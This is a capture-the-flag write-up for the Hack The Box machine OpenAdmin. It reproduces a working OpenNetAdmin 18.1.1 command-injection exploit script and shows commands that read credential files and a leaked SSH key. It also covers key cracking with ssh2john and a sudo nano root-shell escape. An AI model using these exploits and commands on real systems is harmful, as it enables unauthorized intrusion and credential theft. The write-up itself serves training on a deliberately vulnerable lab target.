# Hack The Box  - OpenAdmin 10.10.10.171

![87c64d8779ef284821ade32a84f4319d.png](_resources/e747b28228244e00821545e997ebe9ef.png)

OpenAdmin was an easy rated box from Hack The Box. It starts off by finding an instance of OpenNetAdmin which is vulnerable to a Remote Code Execution. A database credentials is obtained by leveraging the RCE and is reused by one of the user. The first user has access to web resource that are currently hosted internally. A logic flaw in the internal web  allows me to obtain the SSH key of the second user. Next, a sudo  privileges on `nano` editor can be abused to gain root access.

# Reconnaissance
I'll start with port scanning using `nmap`

## Nmap
```bash
nmap -sV -sC -oA OpenAdmin 10.10.10.171
```

- -sC, to scan with default script
- -sV, to scan service version
- -oN, to save the output to .nmap file
- -V, to verbose during the scan.

```bash
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

From the scan results there are two ports open:

- An SSH service running on port 22
- An HTTP service running on port 80

The machine’s host itself is likely running Ubuntu. Currently, there's is no straight exploit have been found, as SSH usually requires valid credentials, hence further enumeration is needed


## TCP  80 - Website 

Visiting port 80 only displays the default Apache page.

![1ad0727e5956f0800cbe4ec0c02df451.png](_resources/4fb96d89a99c4244bb54291abd974267.png)

## Directory Brute Force

Performing directory brute force on the web using  `dirb`  discovered a few hidden web directories

```
dirb http://openadmin.htb/ /usr/share/wordlists/dirb/common.txt -r
```

```bash
... <snip> ...
---- Scanning URL: http://openadmin.htb/ ----
==> DIRECTORY: http://openadmin.htb/artwork/
+ http://openadmin.htb/index.html(CODE:200|SIZE:10918) 
==> DIRECTORY: http:/openadmin.htb/music/
+ http://openadmin.htb/server-status (CODE:200|SIZE:278)
... <snip> ...
```

:: http:/openadmin.htb/artwork/

![image-20210402000812490](_resources/image-20210402000812490.png)

:: http:/openadmin.htb/music/

![image-20210402000847660](_resources/image-20210402000847660.png)

The newly discovered directories mostly contains dummy content, but in `/music`, there's a login menu that links to `http://openadmin.htb/ona`

![f0df4d83acc69be1e666eb6e40a73494.png](_resources/88b4ba1460574b0f88a4acd81e00d392.png)


> OpenNetAdmin is a system to manage network things related to IP address.  

The page shows a warning, it’s complaining for not running the latest version compared to the one currently in use (`v18.1.1`)

# Foothold

## Exploit PoC for OpenNetAdmin 18.1.1 

Based on the version above, a quick search on `exploit-db` shows that current instance of OpenNetAdmin is vulnerable to Remote Code Execution.

>  PoC: https://www.exploit-db.com/exploits/47691

```bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

The exploit PoC is saved as `OpenRCE.sh` and below is the command issued to perform the exploit
```
./OpenRCE.sh http://openadmin.htb/ona/
```

![db477cc560e79f4bf705987c3188ee25.png](_resources/2371e9e41f8449479f1bd8f24e8af888.png)

# Shell as www-data

## File enumeration

```bash
find ./ -type f -user www-data 2>/dev/null
```

The issued command above successfully discovered a database credentials stored inside `/local/config/database_settings.inc.php`.

```bash
cat /opt/ona/www/local/config/database_settings.inc.php
```

```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

There are two users available in `/home` directory.

```bash
$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

# Shell as jimmy

The password from database config is reused by user `jimmy`.

![a0518e175f0d68951eac7bbb348b24e0.png](_resources/25ec2fca7eb84dad9f748aeb299ef35b.png)

But the user flag can not be found in `jimmy`’s home directory.

## File enumeration

For the second time, the find command is issued to search all files accessible/owned by jimmy.

```bash
find / -type f -user jimmy 2>/dev/null
```

It turns out that user jimmy has access to files in `/var/www/internal/` and is currently hosted locally on port 52846.

```bash
$ cat /etc/apache2/sites-enabled/internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

## Code Analysis - Improper Redirection

While inspecting `main.php` source code in `/var/www/internal/`, a logic flaw was found

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

This line code has an improper redirection.
```php
<?php session_start(); 
	if (!isset ($_SESSION['username'])) { 
		header("Location: /index.php"); 
	};
```

It checks for users' session but it doesn’t call a `die()` or `exit()` function after the header location is set to `/index.php` so that the rest of the code below will be executed as well.
```php
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
```

Therefore, by sending normal request with `curl` (default without `-L` option) will prevent the page from redirection and render `joanna`'s SSH key.

![6b73c3ba7aa0ba3e068b85435dc8aeb1.png](_resources/ea391edd6c66409d8bb551eecdac08d5.png)

## Password Cracking

The private key is encrypted with a password. In order to crack the password, it must be converted to the hash form, this can be done by using `ssh2john`.

```bash
python ssh2john.py joanna_rsa > joanna_rsa.hash
```

The password successfully cracked within 17s.

![ca148e3ae5b2e8b65406e0d387ca1771.png](_resources/fa7463b8239345409a2250597b3dfa69.png)

# Shell as joanna

Successfully logged in as joanna.

```
ssh -i joanna_rsa joanna@10.10.10.171
```

![8f710060b1059b0ddb7cae2253e0c1ac.png](_resources/673cb008921d4eba886820c17fef43a0.png)

User flag is done here.

## Sudo privileges 

User joanna has sudo privileges on `/bin/nano`

```bash
$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

# Privilege Escalation

## Abusing sudo nano

Escalation from user `joanna` to gain root access is straight forward. 

By issuing the command below 

```bash
sudo /bin/nano /opt/priv
```

and then hit CTRL + R will allows me to read to root flag after inserting the flag path which is `/root/root.txt`

To spawn a root shell, I used the [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) as reference.

```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

- *^R = CTRL+R*  
- *^X = CTRL+X*